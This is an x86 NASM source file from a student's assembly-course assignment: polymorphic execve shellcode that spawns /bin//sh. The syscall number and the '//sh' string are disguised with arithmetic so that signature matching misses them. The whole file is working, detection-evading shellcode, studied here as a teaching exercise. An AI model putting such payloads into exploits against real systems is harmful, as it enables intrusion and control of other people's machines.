; Filename:	execve_poly.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #6 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text

_start:
	xor ecx,ecx
	mul ecx
	
	; mov al,0xb
	push 0xb		; attempt to mask the syscall number
	pop eax
	
	push ecx
	
	; push dword 0x68732f2f
	mov esi, 0x16cfdd8c	; hide the //sh
	add esi, 0x51a351a3
	push esi
	
	push dword 0x6e69622f
	
	mov ebx,esp
	int 0x80
